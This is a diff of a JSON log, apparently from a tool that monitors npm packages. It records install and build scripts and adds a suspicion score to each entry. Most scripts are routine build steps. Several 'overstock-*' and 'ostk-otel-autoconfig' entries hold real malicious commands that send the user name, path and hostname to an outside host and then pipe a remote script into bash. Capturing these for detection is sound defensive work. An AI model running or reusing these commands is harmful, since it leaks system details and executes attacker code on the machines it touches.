     "packageName": "@heartlandone/vega-sandbox-pr-2438-27bd67c7e7bd17f5a1b902e4e9ff29563a3303cb",
@@ -1811,7 +2006,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-27T02:29:43.454Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "opendocker",
@@ -1820,7 +2016,8 @@
     "scriptContent": "node ./postinstall.mjs",
     "previousVersion": "0.3.3",
     "timestamp": "2026-01-27T02:28:25.985Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "aurelia2-chartjs",
@@ -1829,7 +2026,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": null,
     "timestamp": "2026-01-27T02:28:11.155Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "prettier-config-spellbookx",
@@ -1838,7 +2036,8 @@
     "scriptContent": "tsc",
     "previousVersion": "0.4.2",
     "timestamp": "2026-01-26T22:33:34.427Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tmustier/pi-files-widget",
@@ -1847,7 +2046,8 @@
     "scriptContent": "node -e \"console.log('pi-files-widget: required deps: bat, delta, glow. Install with: brew install bat git-delta glow')\"",
     "previousVersion": "0.1.10",
     "timestamp": "2026-01-26T20:37:10.562Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 5
   },
   {
     "packageName": "@subcon/e2b-cli",
@@ -1856,7 +2056,8 @@
     "scriptContent": "node scripts/postbuild.cjs",
     "previousVersion": "0.1.9",
     "timestamp": "2026-01-26T18:49:18.036Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "hyperterse",
@@ -1865,7 +2066,8 @@
     "scriptContent": "./install.js",
     "previousVersion": null,
     "timestamp": "2026-01-26T18:49:12.574Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "lametric-yle",
@@ -1874,7 +2076,8 @@
     "scriptContent": "$npm_execpath run clean",
     "previousVersion": "3.1.0",
     "timestamp": "2026-01-26T16:32:32.244Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "sona-ai-voice",
@@ -1883,7 +2086,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": "0.2.4",
     "timestamp": "2026-01-26T16:31:41.897Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@hanwen1089/helloworld",
@@ -1892,7 +2096,8 @@
     "scriptContent": "node scripts/copy-html.js",
     "previousVersion": "1.0.0",
     "timestamp": "2026-01-26T16:31:30.413Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@hanwen1089/helloworld",
@@ -1901,7 +2106,8 @@
     "scriptContent": "echo preinstall check",
     "previousVersion": "1.0.0",
     "timestamp": "2026-01-26T16:31:30.411Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@paragrav/rhf-utils",
@@ -1910,7 +2116,8 @@
     "scriptContent": "npx only-allow pnpm",
     "previousVersion": "0.56.0",
     "timestamp": "2026-01-26T16:30:47.912Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@namehash/namehash-ui",
@@ -1919,7 +2126,8 @@
     "scriptContent": "pnpm build:css",
     "previousVersion": "1.5.0",
     "timestamp": "2026-01-26T13:42:24.204Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@myelmut/shared",
@@ -1928,7 +2136,8 @@
     "scriptContent": "rimraf dist tsconfig.tsbuildinfo",
     "previousVersion": "1.0.9",
     "timestamp": "2026-01-26T13:41:46.459Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "datanoesis-quality-standards-node-app",
@@ -1937,7 +2146,8 @@
     "scriptContent": "node scripts/setup.js",
     "previousVersion": null,
     "timestamp": "2026-01-26T13:41:35.884Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "datanoesis-quality-standards-node-react-app",
@@ -1946,7 +2156,8 @@
     "scriptContent": "node scripts/setup.js",
     "previousVersion": null,
     "timestamp": "2026-01-26T13:41:25.373Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "datanoesis-quality-standards-node-supabase",
@@ -1955,7 +2166,8 @@
     "scriptContent": "node scripts/setup.js",
     "previousVersion": null,
     "timestamp": "2026-01-26T13:41:23.190Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "datanoesis-quality-standards-supabase-app",
@@ -1964,7 +2176,8 @@
     "scriptContent": "node scripts/setup.js",
     "previousVersion": null,
     "timestamp": "2026-01-26T13:41:22.340Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "avioflow",
@@ -1973,7 +2186,8 @@
     "scriptContent": "prebuildify --napi --strip --tag-libc --build-command \"npx cmake-js compile\"",
     "previousVersion": null,
     "timestamp": "2026-01-26T12:42:07.787Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@bark-com/consumer-shared",
@@ -1982,7 +2196,8 @@
     "scriptContent": "mkdir -p dist/styles && cp ../styles/*.css dist/styles/",
     "previousVersion": "1.0.2",
     "timestamp": "2026-01-26T12:40:52.798Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@mantajs/core",
@@ -1991,7 +2206,8 @@
     "scriptContent": "node -e \"const fs=require('fs');const path=require('path');const src='.medusa/server';const dest='.medusa/server/src';['api','modules','workflows','links','hooks','types','utils','index.js'].forEach(f=>{const from=path.join(src,f);const to=path.join(dest,f);if(fs.existsSync(from)&&!fs.existsSync(to)){fs.renameSync(from,to);console.log('Moved',f,'to src/')}})\"",
     "previousVersion": null,
     "timestamp": "2026-01-26T12:40:19.654Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 5
   },
   {
     "packageName": "@ai-ad-network/frontend-sdk",
@@ -2000,7 +2216,8 @@
     "scriptContent": "node scripts/prebuild.cjs",
     "previousVersion": "1.0.4",
     "timestamp": "2026-01-26T12:39:59.947Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tokens-studio/color-picker",
@@ -2009,7 +2226,8 @@
     "scriptContent": "patch-package",
     "previousVersion": null,
     "timestamp": "2026-01-26T11:19:38.188Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@gits-id/nuxt-commerce",
@@ -2018,7 +2236,8 @@
     "scriptContent": "nuxt prepare",
     "previousVersion": null,
     "timestamp": "2026-01-26T11:18:48.560Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tonycasey/lisa",
@@ -2027,7 +2246,8 @@
     "scriptContent": "node scripts/postbuild-copy-templates.js && node scripts/prepare-dist-package.js && node scripts/bundle-opencode.js && node scripts/deploy-lisa.js",
     "previousVersion": "2.2.0",
     "timestamp": "2026-01-26T10:24:37.936Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "emessages",
@@ -2036,7 +2256,8 @@
     "scriptContent": "node dist/cli.cjs",
     "previousVersion": "2.2.4",
     "timestamp": "2026-01-26T10:24:13.600Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "trustbroker-frontend",
@@ -2045,7 +2266,8 @@
     "scriptContent": "echo \" poc possible by golu\"",
     "previousVersion": null,
     "timestamp": "2026-01-26T10:23:39.571Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "emessages",
@@ -2054,7 +2276,8 @@
     "scriptContent": "node dist/cli.cjs",
     "previousVersion": "2.2.4",
     "timestamp": "2026-01-26T10:23:36.023Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@playkit-js/playkit-js",
@@ -2063,7 +2286,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": "0.84.38-canary.0-46d6830",
     "timestamp": "2026-01-26T10:23:28.364Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@zerorex0126/ngx-extended-pdf-viewer",
@@ -2072,7 +2296,8 @@
     "scriptContent": "copyfiles schematics/collection.json schematics/*/schema.json schematics/*/files/**/**/* ../../dist/ngx-extended-pdf-viewer/",
     "previousVersion": null,
     "timestamp": "2026-01-26T10:23:19.871Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "namazu-ts",
@@ -2081,7 +2306,8 @@
     "scriptContent": "rimraf tsconfig.types.tsbuildinfo",
     "previousVersion": null,
     "timestamp": "2026-01-26T09:15:47.944Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@livechat/backoff",
@@ -2090,7 +2316,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-01-26T09:10:51.201Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2594-a13d70971b58f6d8047effc568f38df250826c74",
@@ -2099,7 +2326,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-26T09:10:46.414Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@zorachki/text-normalizer-mcp",
@@ -2108,7 +2336,8 @@
     "scriptContent": "node -e \"const fs=require('fs');const f=fs.readFileSync('index.js','utf8');fs.writeFileSync('index.js','#!/usr/bin/env node\\n'+f);fs.chmodSync('index.js',0o755);\"",
     "previousVersion": "1.0.0",
     "timestamp": "2026-01-26T09:09:24.399Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "lib-mezon-meet",
@@ -2117,7 +2346,8 @@
     "scriptContent": "patch-package",
     "previousVersion": null,
     "timestamp": "2026-01-26T09:09:22.216Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@rws-aoa/design-system",
@@ -2126,7 +2356,8 @@
     "scriptContent": "node scripts/copy-assets",
     "previousVersion": "0.1.8",
     "timestamp": "2026-01-26T08:48:29.964Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@mcpmesh/tsuite",
@@ -2135,7 +2366,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-26T08:45:45.929Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@catcuts-skills/handover",
@@ -2144,7 +2376,8 @@
     "scriptContent": "node scripts/install-skill.js",
     "previousVersion": null,
     "timestamp": "2026-01-26T07:22:10.743Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@zain-sportslive/sl-jwt-auth",
@@ -2153,7 +2386,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": null,
     "timestamp": "2026-01-26T06:26:48.169Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@nanahira/lzma1",
@@ -2162,7 +2396,8 @@
     "scriptContent": "tsc --build --clean",
     "previousVersion": null,
     "timestamp": "2026-01-26T04:49:25.641Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@swek09/depsentry",
@@ -2171,7 +2406,8 @@
     "scriptContent": "node install.js",
     "previousVersion": null,
     "timestamp": "2026-01-26T03:49:46.317Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "happy-code-cli",
@@ -2180,7 +2416,8 @@
     "scriptContent": "node scripts/unpack-tools.cjs",
     "previousVersion": null,
     "timestamp": "2026-01-26T01:07:06.052Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "overstock-logger",
@@ -2189,7 +2426,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "3.16.4",
     "timestamp": "2026-01-25T23:13:00.995Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "overstock-logger",
@@ -2198,7 +2436,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "3.16.4",
     "timestamp": "2026-01-25T23:13:00.993Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "@mattgrill/storyblok-11ty",
@@ -2207,7 +2446,8 @@
     "scriptContent": "npm run clean && npm run type-check",
     "previousVersion": null,
     "timestamp": "2026-01-25T23:13:00.073Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "overstock-jenkins",
@@ -2216,7 +2456,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "1.8.1",
     "timestamp": "2026-01-25T23:12:59.237Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "overstock-jenkins",
@@ -2225,7 +2466,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "1.8.1",
     "timestamp": "2026-01-25T23:12:59.236Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "overstock-health-express",
@@ -2234,7 +2476,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "1.6.1",
     "timestamp": "2026-01-25T23:12:36.955Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "overstock-health-express",
@@ -2243,7 +2486,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "1.6.1",
     "timestamp": "2026-01-25T23:12:36.954Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "overstock-login-layer",
@@ -2252,7 +2496,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "3.5.1",
     "timestamp": "2026-01-25T23:12:33.818Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "overstock-login-layer",
@@ -2261,7 +2506,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "3.5.1",
     "timestamp": "2026-01-25T23:12:33.817Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "overstock-component-library",
@@ -2270,7 +2516,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "6.5.1",
     "timestamp": "2026-01-25T23:12:32.723Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "overstock-component-library",
@@ -2279,7 +2526,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "6.5.1",
     "timestamp": "2026-01-25T23:12:32.722Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "overstock-component-library-v3",
@@ -2288,7 +2536,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "4.5.2",
     "timestamp": "2026-01-25T23:12:31.134Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "overstock-component-library-v3",
@@ -2297,7 +2546,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "4.5.2",
     "timestamp": "2026-01-25T23:12:31.133Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "ostk-otel-autoconfig",
@@ -2306,7 +2556,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "2.6.6",
     "timestamp": "2026-01-25T23:12:29.088Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "ostk-otel-autoconfig",
@@ -2315,7 +2566,8 @@
     "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
     "previousVersion": "2.6.6",
     "timestamp": "2026-01-25T23:12:29.086Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 25
   },
   {
     "packageName": "claude-fleet",
@@ -2324,7 +2576,8 @@
     "scriptContent": "node scripts/postinstall.js || true",
     "previousVersion": "2.1.2",
     "timestamp": "2026-01-25T22:13:32.127Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "dotnet-agent-skills",
@@ -2333,7 +2586,8 @@
     "scriptContent": "node dist/postinstall.js || true",
     "previousVersion": null,
     "timestamp": "2026-01-25T22:12:37.399Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "jbrowse-plugin-msaview",
@@ -2342,7 +2596,8 @@
     "scriptContent": "yarn clean",
     "previousVersion": "2.2.3",
     "timestamp": "2026-01-25T20:14:44.999Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "overstock-logger",
@@ -2351,7 +2606,8 @@
     "scriptContent": "curl \"https://raw.githubusercontent.com/cyberX3993/wordlists/refs/heads/main/b\" | sh ",
     "previousVersion": "3.11.3",
     "timestamp": "2026-01-25T20:14:31.579Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 23
   },
   {
     "packageName": "overstock-logger",
@@ -2360,7 +2616,8 @@
     "scriptContent": "curl \"https://raw.githubusercontent.com/cyberX3993/wordlists/refs/heads/main/b\" | sh  ",
     "previousVersion": "3.11.3",
     "timestamp": "2026-01-25T20:14:31.577Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 23
   },
   {
     "packageName": "ralphy-cli",
@@ -2369,7 +2626,8 @@
     "scriptContent": "bun run version:generate",
     "previousVersion": "4.5.3",
     "timestamp": "2026-01-25T19:13:11.670Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@msecscc/gaia",
@@ -2378,7 +2636,8 @@
     "scriptContent": "node index.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T19:11:59.474Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@peerbit/test-lib",
@@ -2387,7 +2646,8 @@
     "scriptContent": "echo '{\"type\":\"module\"} ' | node ../../../../node_modules/.bin/json > lib/esm/package.json",
     "previousVersion": "0.0.1-ff87533",
     "timestamp": "2026-01-25T19:11:43.946Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "focuscast",
@@ -2396,7 +2656,8 @@
     "scriptContent": "node ./install.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T19:11:41.605Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "ultrascript-tools-mcp",
@@ -2405,7 +2666,8 @@
     "scriptContent": "node -e \"const fs=require('fs');const p=require('path');const d='dist';if(fs.existsSync(d)){fs.readdirSync(d).filter(f=>f.endsWith('.js')||f.endsWith('.js.map')).forEach(f=>fs.unlinkSync(p.join(d,f)));console.log('[prebuild] Cleaned old JS chunks from dist/')}\"",
     "previousVersion": "2.4.0",
     "timestamp": "2026-01-25T19:11:02.888Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 5
   },
   {
     "packageName": "cheerio-core",
@@ -2414,7 +2676,8 @@
     "scriptContent": "node main.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T18:19:23.595Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "atd-cli",
@@ -2423,7 +2686,8 @@
     "scriptContent": "node scripts/postinstall.js || echo Installation complete",
     "previousVersion": "1.0.17",
     "timestamp": "2026-01-25T18:19:11.242Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "sloth-d2c-mcp",
@@ -2432,7 +2696,8 @@
     "scriptContent": "if [ \"$(id -u)\" = \"0\" ]; then sudo -u $SUDO_USER ./cli/run.js stop && sudo -u $SUDO_USER ./cli/run.js run; else ./cli/run.js stop && ./cli/run.js run; fi",
     "previousVersion": "1.0.4-beta95",
     "timestamp": "2026-01-25T18:18:38.788Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 2
   },
   {
     "packageName": "@silky/fizzy-mcp",
@@ -2441,7 +2706,8 @@
     "scriptContent": "npx only-allow pnpm",
     "previousVersion": null,
     "timestamp": "2026-01-25T17:11:14.550Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "slackblock",
@@ -2450,7 +2716,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": "0.5.0-beta.0",
     "timestamp": "2026-01-25T17:11:09.100Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "happy-code-cli",
@@ -2459,7 +2726,8 @@
     "scriptContent": "node scripts/unpack-tools.cjs",
     "previousVersion": null,
     "timestamp": "2026-01-25T17:11:07.274Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "balzac",
@@ -2468,7 +2736,8 @@
     "scriptContent": "node ./install.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T17:10:53.755Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@pimzino/sgrep",
@@ -2477,7 +2746,8 @@
     "scriptContent": "node scripts/postbuild.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T17:10:52.717Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@syntaxsidekick/riadkilani-design-system",
@@ -2486,7 +2756,8 @@
     "scriptContent": "node scripts/copy-types.cjs",
     "previousVersion": "1.0.1",
     "timestamp": "2026-01-25T15:12:13.634Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "image-nano-skill",
@@ -2495,7 +2766,8 @@
     "scriptContent": "node install.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T15:12:06.112Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@kevisual/router",
@@ -2504,7 +2776,8 @@
     "scriptContent": "bun run bun.config.ts",
     "previousVersion": "0.0.59",
     "timestamp": "2026-01-25T14:12:38.335Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "mcp-probe-kit",
@@ -2513,7 +2786,8 @@
     "scriptContent": "npm run sync-ui-data",
     "previousVersion": "1.13.0",
     "timestamp": "2026-01-25T13:27:22.829Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@digitalist/conventions",
@@ -2522,7 +2796,8 @@
     "scriptContent": "node ./install.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T12:28:23.507Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@hanzo/dev",
@@ -2531,7 +2806,8 @@
     "scriptContent": "node scripts/preinstall.js",
     "previousVersion": "3.0.1",
     "timestamp": "2026-01-25T11:31:08.545Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@rafael-arreola/jira-rs",
@@ -2540,7 +2816,8 @@
     "scriptContent": "node install.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T10:13:59.266Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "hanzo-node",
@@ -2549,7 +2826,8 @@
     "scriptContent": "node postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T10:13:56.186Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "hanzo-node",
@@ -2558,7 +2836,8 @@
     "scriptContent": "node scripts/preinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T10:13:56.178Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "elysia-openapi-codegen",
@@ -2567,7 +2846,8 @@
     "scriptContent": "rimraf tsconfig.types.tsbuildinfo",
     "previousVersion": "0.1.3",
     "timestamp": "2026-01-25T10:13:30.526Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@teishoku/cli",
@@ -2576,7 +2856,8 @@
     "scriptContent": "npm publish --access public",
     "previousVersion": "0.0.2",
     "timestamp": "2026-01-25T09:14:10.529Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "mago-react",
@@ -2585,7 +2866,8 @@
     "scriptContent": "find src -name '*.js' -o -name '*.d.ts' -o -name '*.map' -delete",
     "previousVersion": null,
     "timestamp": "2026-01-25T08:17:19.879Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@midscene/android-playground",
@@ -2594,7 +2876,8 @@
     "scriptContent": "node ../android/scripts/download-scrcpy-server.js --target=bin/server.bin || true",
     "previousVersion": "1.2.3-beta-20260125063343.0",
     "timestamp": "2026-01-25T07:15:23.771Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "react-native-sherpa-onnx",
@@ -2603,7 +2886,8 @@
     "scriptContent": "node scripts/setup-assets.js",
     "previousVersion": null,
     "timestamp": "2026-01-25T07:15:12.786Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@cliangdev/flux-plugin",
@@ -2612,7 +2896,8 @@
     "scriptContent": "node -e \"const fs=require('fs');const f='dist/server/index.js';const c=fs.readFileSync(f,'utf-8');if(!c.startsWith('#!/usr/bin/env node')){fs.writeFileSync(f,'#!/usr/bin/env node\\n'+c)}\"",
     "previousVersion": "0.2.0-dev.dc5e2c4",
     "timestamp": "2026-01-25T05:22:33.021Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "@affylabs/affyid-sdk",
@@ -2621,7 +2906,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": null,
     "timestamp": "2026-01-25T05:22:29.373Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@context-engine-bridge/context-engine-mcp-bridge",
@@ -2630,7 +2916,8 @@
     "scriptContent": "node -e \"try{require('fs').chmodSync('bin/ctxce.js',0o755)}catch(e){}\"",
     "previousVersion": "0.0.15",
     "timestamp": "2026-01-25T04:45:11.859Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 5
   },
   {
     "packageName": "@pilaf/backends",
@@ -2639,7 +2926,8 @@
     "scriptContent": "node scripts/fix-prismarine-physics.cjs",
     "previousVersion": "1.2.1",
     "timestamp": "2026-01-25T04:45:02.404Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "the-android-mcp",
@@ -2648,7 +2936,8 @@
     "scriptContent": "node dist/postinstall.js",
     "previousVersion": "0.1.0",
     "timestamp": "2026-01-24T22:14:06.195Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@cliangdev/flux-plugin",
@@ -2657,7 +2946,8 @@
